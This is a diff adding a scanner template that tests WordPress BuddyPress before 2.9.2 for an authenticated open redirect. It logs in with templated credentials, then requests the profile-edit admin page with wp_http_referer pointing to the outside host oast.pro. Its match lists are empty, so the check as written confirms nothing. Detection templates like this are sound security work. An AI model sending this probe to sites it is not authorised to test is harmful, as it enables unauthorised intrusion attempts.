@@ -1,0 +1,26 @@
+id: wp-buddypress-open-redirect
+brief:
+    title: WordPress BuddyPress < 2.9.2 - Authenticated Open Redirect
+    by: 0x_Akoko
+    level: low
+    about: WordPress BuddyPress plugin before 2.9.2 contains an authenticated open redirect vulnerability via the wp_http_referer parameter on the bp-profile-edit admin page. After updating profile, the Back ...
+    label:
+        - wordpress
+        - wp-plugin
+        - vuln
+        - buddypress
+        - redirect
+        - authenticated
+    score: CVSS:2.4
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/wp-login.php'
+      head:
+        Content-Type: application/x-www-form-urlencoded
+      body: log={{username}}&pwd={{password}}&wp-submit=Log+In
+      signs: []
+    - verb: GET
+      to:
+        - '{{BaseURL}}/wp-admin/users.php?page=bp-profile-edit&wp_http_referer=https%3A%2F%2Foast.pro&updated=1'
+      signs: []
